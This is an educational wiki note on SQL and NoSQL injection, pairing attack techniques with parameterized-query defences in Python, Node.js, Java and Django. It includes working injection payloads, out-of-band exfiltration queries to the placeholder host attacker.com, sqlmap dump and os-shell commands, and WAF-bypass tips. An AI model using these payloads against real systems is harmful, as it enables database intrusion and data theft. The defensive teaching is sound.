---
title: SQL Injection Deep Dive
category: techniques
tags: [security, sql-injection, database, sqlmap, web-security]
---

# SQL Injection Deep Dive

Comprehensive coverage of SQL injection: in-band (UNION-based), blind (boolean and time-based), out-of-band techniques, sqlmap automation, and prevention via parameterized queries across multiple languages and ORMs.

## Key Facts
- SQL injection occurs when user input is concatenated into SQL queries without sanitization
- Parameterized queries / prepared statements are the primary defense - not input validation alone
- ORMs use parameterized queries by default, but raw query methods bypass protection
- Blind SQLi extracts data character by character when no error/data is visible in responses
- `sqlmap` automates detection and exploitation of all SQLi types

## Types of SQL Injection

### Classic In-Band
```sql
-- Authentication bypass
SELECT * FROM users WHERE username='admin'--' AND password='anything'

-- UNION-based data extraction
SELECT * FROM users WHERE id=1 UNION SELECT username,password,3 FROM admin_users--
```

### Blind Boolean-Based
Query changes response behavior without showing data:
```sql
-- Determine database name length
id=1 AND LENGTH(database())=5

-- Extract character by character
id=1 AND SUBSTRING(database(),1,1)='a'
id=1 AND ASCII(SUBSTRING(database(),1,1))>96
```

### Blind Time-Based
Introduce measurable delay to infer true/false:
```sql
-- MySQL
id=1 AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)

-- MSSQL
id=1; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'

-- PostgreSQL
id=1; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a'
  THEN pg_sleep(5) ELSE pg_sleep(0) END
```

### Out-of-Band
Exfiltrate data via DNS or HTTP when no in-band channel exists:
```sql
-- MySQL DNS exfiltration
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\x'))

-- MSSQL
EXEC master..xp_dirtree '\\attacker.com\share'

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
```

## Patterns

### sqlmap Automation
```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1"

# With authentication
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Enumerate databases, tables, dump data
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# OS shell (if permissions allow)
sqlmap -u "http://target.com/page?id=1" --os-shell

# POST request
sqlmap -u "http://target.com/login" --data="user=test&pass=test"
```

### Prevention: Parameterized Queries

**Python (psycopg2):**
```python
# WRONG - vulnerable
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")

# CORRECT
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

**Node.js (pg):**
```javascript
// WRONG
client.query(`SELECT * FROM users WHERE id = ${userId}`)

// CORRECT
client.query('SELECT * FROM users WHERE id = $1', [userId])
```

**Java (JDBC):**
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

### ORM Safety
ORMs (SQLAlchemy, Django ORM, Prisma, Sequelize) use parameterized queries by default. BUT raw query methods bypass this:
```python
# Django - STILL VULNERABLE if interpolating user input
Model.objects.raw(f"SELECT * FROM table WHERE id = {user_input}")

# Safe
Model.objects.raw("SELECT * FROM table WHERE id = %s", [user_input])
```

## NoSQL Injection
MongoDB query injection via JSON operators:
```javascript
// Vulnerable
db.users.find({ username: req.body.username, password: req.body.password })

// Attack payload (bypasses auth)
{ "username": "admin", "password": { "$ne": "" } }

// Other abused operators: $gt, $regex, $where
{ "username": { "$regex": ".*" }, "password": { "$regex": ".*" } }
```

Prevention: input type validation (reject objects where strings expected), `express-mongo-sanitize` middleware, avoid `$where` operator.

## Gotchas
- WAF rules catch common patterns but are bypassed by encoding, case variation, or comments (`/**/`)
- Second-order SQLi: input stored safely, then used in a query elsewhere without parameterization
- Blind SQLi is slow (character by character) but fully automated by tools like sqlmap
- Database user permissions limit damage: read-only user prevents `DROP TABLE` even if injection succeeds
- ORMs are safe by default, but every ORM provides a raw query escape hatch that developers misuse

## See Also
- [[web-application-security-fundamentals]] - OWASP Top 10, other web vulns
- [[database-security]] - user privileges, encryption, auditing
- [[burp-suite-and-web-pentesting]] - testing SQL injection with Burp
- [[secure-backend-development]] - input validation patterns
